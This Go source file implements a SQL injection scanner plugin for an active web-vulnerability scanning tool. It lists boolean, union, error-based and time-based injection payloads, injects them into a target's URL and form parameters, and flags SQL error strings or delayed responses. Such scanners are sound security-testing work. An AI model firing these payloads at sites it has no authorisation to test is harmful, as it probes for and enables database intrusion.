package plugins

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"hackmitm-desktop/internal/activescan"
)

// SQLInjectionPlugin detects SQL injection vulnerabilities
type SQLInjectionPlugin struct {
	*BasePlugin
}

// NewSQLInjectionPlugin creates a new SQL injection detection plugin
func NewSQLInjectionPlugin() *SQLInjectionPlugin {
	payloads := []string{
		// Basic injection
		"'",
		"\"",
		"' OR '1'='1",
		"' OR '1'='1'--",
		"' OR '1'='1'/*",
		"\" OR \"1\"=\"1",
		"\" OR \"1\"=\"1\"--",
		"1' OR '1'='1",
		"1 OR 1=1",
		"1 OR 1=1--",
		// Union based
		"' UNION SELECT NULL--",
		"' UNION SELECT NULL,NULL--",
		"' UNION SELECT NULL,NULL,NULL--",
		"1 UNION SELECT NULL--",
		// Error based
		"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
		"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
		// Time based
		"'; WAITFOR DELAY '0:0:5'--",
		"' AND SLEEP(5)--",
		"1; SELECT SLEEP(5)#",
		// Comment injection
		"'--",
		"'#",
		"'/*",
	}

	return &SQLInjectionPlugin{
		BasePlugin: NewBasePlugin(
			"SQL-INJECTION",
			"SQL Injection",
			"Detects SQL injection vulnerabilities by injecting various SQL payloads",
			activescan.SeverityHigh,
			payloads,
		),
	}
}

// Scan performs SQL injection testing on the target
func (p *SQLInjectionPlugin) Scan(target *activescan.Target, client *http.Client, config *activescan.ScanConfig) ([]*activescan.Finding, error) {
	var findings []*activescan.Finding

	// Error patterns that indicate SQL injection
	errorPatterns := []string{
		"sql syntax",
		"mysql_fetch",
		"ora-",
		"oracle",
		"postgresql",
		"pg_",
		"sqlite",
		"microsoft sql server",
		"syntax error",
		"unclosed quotation",
		"quoted string not properly terminated",
		"warning: mysql",
		"invalid query",
		"odbc",
		"jdbc",
		"pdo",
		"you have an error in your sql syntax",
		"supplied argument is not a valid mysql",
	}

	timeBasedPatterns := []string{
		// These are detected by response time, not content
	}

	for _, payload := range p.Payloads() {
		// Test in URL parameters
		f := p.testInURL(target, client, config, payload, errorPatterns)
		if f != nil {
			findings = append(findings, f)
		}

		// Test in body
		f = p.testInBody(target, client, config, payload, errorPatterns)
		if f != nil {
			findings = append(findings, f)
		}
	}

	// Time-based detection
	timeFindings := p.testTimeBased(target, client, config, timeBasedPatterns)
	findings = append(findings, timeFindings...)

	return findings, nil
}

func (p *SQLInjectionPlugin) testInURL(target *activescan.Target, client *http.Client, config *activescan.ScanConfig, payload string, patterns []string) *activescan.Finding {
	parsedURL, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	query := parsedURL.Query()
	for param := range query {
		// Save original value
		originalValue := query.Get(param)

		// Inject payload
		query.Set(param, originalValue+payload)
		parsedURL.RawQuery = query.Encode()

		startTime := time.Now()
		resp, body, err := SendRequest(client, target.Method, parsedURL.String(), target.Headers, nil)
		if err != nil {
			query.Set(param, originalValue)
			continue
		}

		elapsed := time.Since(startTime)
		_ = elapsed // Could be used for time-based detection

		// Check for error patterns
		if CheckMultiplePatterns(body, patterns) || CheckMultiplePatterns(resp.Status, patterns) {
			request := fmt.Sprintf("%s %s\nPayload: %s -> %s", target.Method, parsedURL.String(), param, payload)
			return CreateFinding(p.BasePlugin, target, payload, "SQL error detected in response", request, body)
		}

		// Restore original value
		query.Set(param, originalValue)
	}

	return nil
}

func (p *SQLInjectionPlugin) testInBody(target *activescan.Target, client *http.Client, config *activescan.ScanConfig, payload string, patterns []string) *activescan.Finding {
	if target.Method == "GET" || target.Body == "" {
		return nil
	}

	// Try to parse as form data
	contentType := ""
	for k, v := range target.Headers {
		if strings.ToLower(k) == "content-type" {
			contentType = v
			break
		}
	}

	if strings.Contains(contentType, "application/x-www-form-urlencoded") {
		formData, err := url.ParseQuery(target.Body)
		if err != nil {
			return nil
		}

		for param := range formData {
			originalValue := formData.Get(param)
			formData.Set(param, originalValue+payload)

			resp, body, err := SendRequest(client, target.Method, target.URL, target.Headers, []byte(formData.Encode()))
			if err != nil {
				formData.Set(param, originalValue)
				continue
			}

			if CheckMultiplePatterns(body, patterns) || CheckMultiplePatterns(resp.Status, patterns) {
				request := fmt.Sprintf("%s %s\nBody: %s", target.Method, target.URL, formData.Encode())
				return CreateFinding(p.BasePlugin, target, payload, "SQL error detected in response", request, body)
			}

			formData.Set(param, originalValue)
		}
	}

	return nil
}

func (p *SQLInjectionPlugin) testTimeBased(target *activescan.Target, client *http.Client, config *activescan.ScanConfig, patterns []string) []*activescan.Finding {
	var findings []*activescan.Finding

	timePayloads := []struct {
		payload   string
		delay     time.Duration
	}{
		{"' AND SLEEP(5)--", 5 * time.Second},
		{"'; WAITFOR DELAY '0:0:5'--", 5 * time.Second},
		{"1; SELECT SLEEP(5)#", 5 * time.Second},
	}

	parsedURL, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	query := parsedURL.Query()
	for param := range query {
		originalValue := query.Get(param)

		for _, tp := range timePayloads {
			query.Set(param, originalValue+tp.payload)
			parsedURL.RawQuery = query.Encode()

			startTime := time.Now()
			_, _, err := SendRequest(client, target.Method, parsedURL.String(), target.Headers, nil)
			elapsed := time.Since(startTime)

			query.Set(param, originalValue)

			if err != nil {
				continue
			}

			// If response took longer than expected delay, likely vulnerable
			if elapsed >= tp.delay-500*time.Millisecond {
				request := fmt.Sprintf("%s %s\nPayload: %s -> %s (Response time: %v)", target.Method, parsedURL.String(), param, tp.payload, elapsed)
				finding := CreateFinding(p.BasePlugin, target, tp.payload, fmt.Sprintf("Time-based SQL injection detected (response time: %v)", elapsed), request, "")
				finding.Confidence = 90
				findings = append(findings, finding)
			}
		}
	}

	return findings
}
